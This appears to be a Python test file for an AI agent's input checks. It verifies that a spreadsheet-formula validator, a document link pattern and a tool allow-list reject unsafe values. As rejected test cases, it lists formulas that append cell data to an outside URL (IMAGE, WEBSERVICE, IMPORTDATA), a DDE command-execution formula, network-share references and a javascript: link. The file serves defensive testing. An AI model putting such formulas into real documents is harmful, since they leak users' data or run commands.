"""Tests of the input checks on model-supplied values.

The model may be acting on other people's mail and documents, so what it
passes to the tools is checked before it reaches a file or a request path.

Run from the runtime directory: uv run python -m unittest discover -s tests
"""

import unittest

from src.documents.docx_builder import _LINK_RE
from src.documents.xlsx_builder import is_safe_formula
from src.tools import _create_user_token_mcp_client


class FormulaTest(unittest.TestCase):
    def test_calculations_are_formulas(self):
        for formula in ["=C2*D2", "=D5/SUM(D$2:D$9)", '=IF(AND(A2>0,B2<>""),ROUND(A2/B2,1),"")', "=sum(A1:A3)", "='Sheet 2'!B4+1", "=IFERROR(VLOOKUP(A2,Master!A:C,3,FALSE),0)"]:
            self.assertTrue(is_safe_formula(formula), formula)

    def test_formulas_that_can_send_data_out_stay_text(self):
        for formula in [
            '=IMAGE("https://example.com/?d="&B2)',
            '=IMPORTDATA("https://example.com/x")',
            '=WEBSERVICE("http://example.com/"&A1)',
            '=HYPERLINK("https://example.com/"&A1,"open")',
            "=cmd|'/c calc'!A1",
            "=[Budget.xlsx]Sheet1!A1",
            '=IF(A1>0,IMPORTXML("https://example.com","//a"),0)',
            '=INDIRECT("A"&1)',
            "=\\\\server\\share\\book.xlsx!A1",
        ]:
            self.assertFalse(is_safe_formula(formula), formula)


class DocxLinkTest(unittest.TestCase):
    def test_only_http_links_become_hyperlinks(self):
        self.assertIsNotNone(_LINK_RE.fullmatch("[site](https://example.com/a)"))
        for text in ["[share](file://server/share)", "[x](javascript:alert(1))", "[x](\\\\server\\share)", "[site](https://example.com) and more"]:
            self.assertIsNone(_LINK_RE.fullmatch(text), text)


class ToolFilterTest(unittest.TestCase):
    def filters(self, config: dict):
        client = _create_user_token_mcp_client({"url": "https://example.com/mcp", **config}, "token")
        return client._tool_filters

    def test_only_the_allowed_tools_are_exposed(self):
        self.assertEqual(self.filters({"allowedTools": ["search_files"]}), {"allowed": ["search_files"]})

    def test_an_empty_allow_list_is_not_treated_as_no_filter(self):
        self.assertEqual(self.filters({"allowedTools": []}), {"allowed": []})


if __name__ == "__main__":
    unittest.main()
